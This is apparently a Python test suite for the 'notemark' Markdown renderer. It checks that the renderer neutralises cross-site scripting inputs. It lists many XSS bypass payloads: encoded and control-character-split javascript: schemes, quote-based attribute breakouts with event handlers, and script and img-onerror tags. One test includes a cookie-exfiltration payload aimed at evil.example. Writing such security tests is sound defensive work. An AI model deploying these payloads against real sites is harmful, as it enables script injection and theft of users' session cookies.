import re
import unittest
from html.parser import HTMLParser

from notemark import to_html

ALLOWED_TAGS = {'p', 'br', 'strong', 'em', 'code', 'a'}
SAFE_SCHEMES = {'http', 'https', 'mailto'}
_SCHEME = re.compile(r'([A-Za-z][A-Za-z0-9+.-]*):')
_C0_SPACE = ''.join(chr(c) for c in range(0x21))


def browser_scheme(href):
    """What a browser would treat as the scheme of this (already attribute-decoded) href."""
    url = re.sub(r'[\t\n\r]', '', href).strip(_C0_SPACE)
    m = _SCHEME.match(url)
    return m.group(1).lower() if m else None


class Oracle(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.problems = []

    def handle_starttag(self, tag, attrs):
        if tag not in ALLOWED_TAGS:
            self.problems.append('tag %s' % tag)
        names = [name for name, _ in attrs]
        if tag == 'a':
            if names != ['href']:
                self.problems.append('a attributes %r' % names)
            for name, value in attrs:
                if name == 'href':
                    scheme = browser_scheme(value or '')
                    if scheme is not None and scheme not in SAFE_SCHEMES:
                        self.problems.append('href scheme %s in %r' % (scheme, value))
        elif names:
            self.problems.append('%s attributes %r' % (tag, names))

    handle_startendtag = handle_starttag

    def handle_comment(self, data):
        self.problems.append('comment')

    def handle_decl(self, decl):
        self.problems.append('declaration')

    def handle_pi(self, data):
        self.problems.append('processing instruction')


def problems(html):
    oracle = Oracle()
    oracle.feed(html)
    oracle.close()
    return oracle.problems


PAYLOAD_GROUPS = {
    'plain_and_case': [
        '[a](javascript:alert%281%29)',
        '[a](JaVaScRiPt:alert%281%29)',
        '[a](vbscript:msgbox)',
        '[a](data:text/html;base64,PHNjcmlwdD4=)',
    ],
    'encoded_schemes': [
        '[a](javascript&#58;alert%281%29)',
        '[a](javascript&#x3a;alert%281%29)',
        '[a](javascript&#X3A;alert%281%29)',
        '[a](&#106;avascript:alert%281%29)',
        '[a](&#x6A;avascript:alert%281%29)',
        '[a](&#0000106;avascript:alert%281%29)',
    ],
    'control_characters': [
        '[a](java&#9;script:alert%281%29)',
        '[a](java&#10;script:alert%281%29)',
        '[a](java&#13;script:alert%281%29)',
        '[a](java\tscript:alert%281%29)',
        '[a](&#1;javascript:alert%281%29)',
        '[a](&#31;&#32;javascript:alert%281%29)',
        '[a](&#32;javascript:alert%281%29)',
        '[a](javascript:alert%281%29&#32;)',
    ],
    'double_encoding': [
        '[a](&amp;#106;avascript:alert%281%29)',
        '[a](&amp;amp;#106;avascript:x)',
        '[a](&amp;#x6A;ava&amp;#9;script:x)',
    ],
    'link_attribute_breakout': [
        '[a](https://ok.example/"onclick="alert%281%29)',
        "[a](https://ok.example/'onclick='alert%281%29)",
        '[x](https://ok.example/&#x22;onmouseover=&#x22;alert%281%29)',
        '[x](https://ok.example/&#x22; onmouseover=&#x22;alert%281%29)',
    ],
    'autolink_breakout': [
        '<https://ok.example/"onmouseover="alert%281%29>',
        "<https://ok.example/'onmouseover='alert%281%29>",
        '<https://ok.example/&#34;onmouseover=&#34;alert%281%29>',
        '<https://ok.example/&quot;><script>alert%281%29</script>>',
        '<mailto:x@example.com?subject=&#34;><img>',
    ],
    'markup_wrapped': [
        '**[a](javascript&#58;x)** _[b](&#106;avascript:x)_',
        '[<img src=x onerror=alert(1)>](https://ok.example)',
        '@bob"onmouseover="x <b>@al_1</b>',
    ],
    'raw_html': [
        '`<script>alert(1)</script>` <script>alert(1)</script>',
        '&lt;script&gt;alert(1)&lt;/script&gt; &#60;img src=x onerror=alert(1)&#62;',
        '<!-- x --> <?php ?> <!DOCTYPE html>',
    ],
}


class SecurityTests(unittest.TestCase):
    def check_group(self, name):
        for payload in PAYLOAD_GROUPS[name]:
            html = to_html(payload)
            self.assertEqual(problems(html), [], '%r -> %r' % (payload, html))

    def test_safe_plain_and_case_variants(self):
        self.check_group('plain_and_case')

    def test_safe_encoded_schemes(self):
        self.check_group('encoded_schemes')

    def test_safe_control_characters(self):
        self.check_group('control_characters')

    def test_safe_double_encoding(self):
        self.check_group('double_encoding')

    def test_safe_link_attribute_breakout(self):
        self.check_group('link_attribute_breakout')

    def test_safe_autolink_breakout(self):
        self.check_group('autolink_breakout')

    def test_safe_markup_wrapped(self):
        self.check_group('markup_wrapped')

    def test_safe_raw_html(self):
        self.check_group('raw_html')

    def test_reported_payloads_render_text_only(self):
        self.assertEqual(to_html('[click here](javascript&#58;alert%28document.cookie%29)'), '<p>click here</p>')
        self.assertEqual(to_html('[invoice](&#x6A;avascript:fetch%28%27//evil.example/%27+document.cookie%29)'),
                         '<p>invoice</p>')
        self.assertEqual(to_html('[docs](java&#9;script:alert%281%29)'), '<p>docs</p>')

    def test_entity_encoded_schemes(self):
        for dest in ['javascript&#58;x', 'javascript&#x3A;x', '&#106;avascript:x', '&#x4A;AVASCRIPT:x',
                     'data&#58;text/html,x', 'vbscript&#x3a;x']:
            self.assertEqual(to_html('[t](%s)' % dest), '<p>t</p>', dest)

    def test_control_characters_are_removed_before_the_scheme_check(self):
        for dest in ['java&#9;script:x', 'java&#10;script:x', 'jav&#13;ascript:x', 'java\tscript:x',
                     '&#1;javascript:x', '&#31;javascript:x', '&#32;&#32;javascript:x', 'j&#9;a&#10;v&#13;ascript:x']:
            self.assertEqual(to_html('[t](%s)' % dest), '<p>t</p>', repr(dest))

    def test_references_are_decoded_exactly_once(self):
        self.assertEqual(to_html('[x](&amp;#106;avascript:x)'), '<p><a href="&amp;#106;avascript:x">x</a></p>')
        self.assertEqual(to_html('[x](&amp;#x6A;avascript:x)'), '<p><a href="&amp;#x6A;avascript:x">x</a></p>')

    def test_autolink_attribute_breakout(self):
        self.assertEqual(to_html('see <https://status.example.com/"onmouseover="alert%281%29>'),
                         '<p>see <a href="https://status.example.com/&quot;onmouseover=&quot;alert%281%29">'
                         'https://status.example.com/"onmouseover="alert%281%29</a></p>')
        self.assertEqual(to_html("<https://a.example/'x>"),
                         '<p><a href="https://a.example/&#39;x">https://a.example/\'x</a></p>')

    def test_autolink_encoded_quote(self):
        self.assertEqual(to_html('<https://a.example/&#34;onmouseover=x>'),
                         '<p><a href="https://a.example/&quot;onmouseover=x">https://a.example/"onmouseover=x</a></p>')

    def test_link_destination_quotes_escaped(self):
        self.assertEqual(to_html("[q](https://ex.com/it's)"), '<p><a href="https://ex.com/it&#39;s">q</a></p>')
        self.assertEqual(to_html('[q](https://ex.com/"x)'), '<p><a href="https://ex.com/&quot;x">q</a></p>')
        self.assertEqual(to_html('[q](https://ex.com/&#34;x)'), '<p><a href="https://ex.com/&quot;x">q</a></p>')


class RenderingTests(unittest.TestCase):
    def test_existing_formatting_unchanged(self):
        self.assertEqual(to_html('Hello **world** and _you_'),
                         '<p>Hello <strong>world</strong> and <em>you</em></p>')
        self.assertEqual(to_html('a\r\nb\r\n\r\nc'), '<p>a<br>b</p>\n<p>c</p>')
        self.assertEqual(to_html('hi @bob_1! mail@host'), '<p>hi <a href="/u/bob_1">@bob_1</a>! mail@host</p>')
        self.assertEqual(to_html('\\*not em\\* \\[x\\](y) \\&amp;'), '<p>*not em* [x](y) &amp;amp;</p>')
        self.assertEqual(to_html('[**bold** link](https://x.io)'),
                         '<p><a href="https://x.io"><strong>bold</strong> link</a></p>')

    def test_text_references_decoded_once_then_escaped(self):
        self.assertEqual(to_html('AT&amp;T and AT&T'), '<p>AT&amp;T and AT&amp;T</p>')
        self.assertEqual(to_html('&copy; &amp;lt; &#60;b&#x3E; &#0; &#xD800;'),
                         '<p>&amp;copy; &amp;lt; &lt;b&gt; &amp;#0; &amp;#xD800;</p>')
        self.assertEqual(to_html('[AT&amp;T](https://x.io)'), '<p><a href="https://x.io">AT&amp;T</a></p>')

    def test_code_spans_are_literal(self):
        self.assertEqual(to_html('Use `&lt;div&gt;` for wrappers'),
                         '<p>Use <code>&amp;lt;div&amp;gt;</code> for wrappers</p>')
        self.assertEqual(to_html('`**x** [a](b) &amp; <b>`'), '<p><code>**x** [a](b) &amp;amp; &lt;b&gt;</code></p>')

    def test_ampersands_in_link_destinations(self):
        expected = '<p><a href="https://ex.com/a?x=1&amp;y=2">docs</a></p>'
        self.assertEqual(to_html('[docs](https://ex.com/a?x=1&amp;y=2)'), expected)
        self.assertEqual(to_html('[docs](https://ex.com/a?x=1&y=2)'), expected)
        self.assertEqual(to_html('[docs](https://ex.com/a?x=1&#38;y=2)'), expected)

    def test_autolink_ampersands(self):
        self.assertEqual(to_html('Tracking: <https://ship.example/?id=7&amp;lang=en>'),
                         '<p>Tracking: <a href="https://ship.example/?id=7&amp;lang=en">'
                         'https://ship.example/?id=7&amp;lang=en</a></p>')
        self.assertEqual(to_html('<mailto:ops@example.com?subject=a&b>'),
                         '<p><a href="mailto:ops@example.com?subject=a&amp;b">mailto:ops@example.com?subject=a&amp;b</a></p>')

    def test_scheme_detection_and_relative_urls(self):
        self.assertEqual(to_html('[a](foo/bar:baz)'), '<p><a href="foo/bar:baz">a</a></p>')
        self.assertEqual(to_html('[a](?next=x:y)'), '<p><a href="?next=x:y">a</a></p>')
        self.assertEqual(to_html('[a](#sec:2)'), '<p><a href="#sec:2">a</a></p>')
        self.assertEqual(to_html('[a](foo:bar)'), '<p>a</p>')
        self.assertEqual(to_html('[a](c++:x)'), '<p>a</p>')
        self.assertEqual(to_html('[m](MAILTO:me@example.com)'), '<p><a href="MAILTO:me@example.com">m</a></p>')
        self.assertEqual(to_html('[h](HTTPS://Example.com/Path)'), '<p><a href="HTTPS://Example.com/Path">h</a></p>')

    def test_safe_destinations_are_cleaned(self):
        self.assertEqual(to_html('[a](https://ex.com/a&#9;b)'), '<p><a href="https://ex.com/ab">a</a></p>')
        self.assertEqual(to_html('[a](&#32;https://ex.com/&#10;)'), '<p><a href="https://ex.com/">a</a></p>')
        self.assertEqual(to_html('[a](&#1;/local)'), '<p><a href="/local">a</a></p>')

    def test_empty_destination_after_cleaning_is_not_linked(self):
        self.assertEqual(to_html('[a](&#32;)'), '<p>a</p>')
        self.assertEqual(to_html('[a](&#9;&#10;)'), '<p>a</p>')

    def test_links_and_autolinks_do_not_nest(self):
        self.assertEqual(to_html('[see <https://x.io> @bob](https://y.io)'),
                         '<p><a href="https://y.io">see &lt;https://x.io&gt; @bob</a></p>')

    def test_unclosed_markers_and_bad_links_are_literal(self):
        self.assertEqual(to_html('**a _b `c [d](e f) <g>'), '<p>**a _b `c [d](e f) &lt;g&gt;</p>')

    def test_unsafe_link_keeps_formatted_text(self):
        self.assertEqual(to_html('[**click** _me_](javascript&#58;x) now'),
                         '<p><strong>click</strong> <em>me</em> now</p>')


if __name__ == '__main__':
    unittest.main()
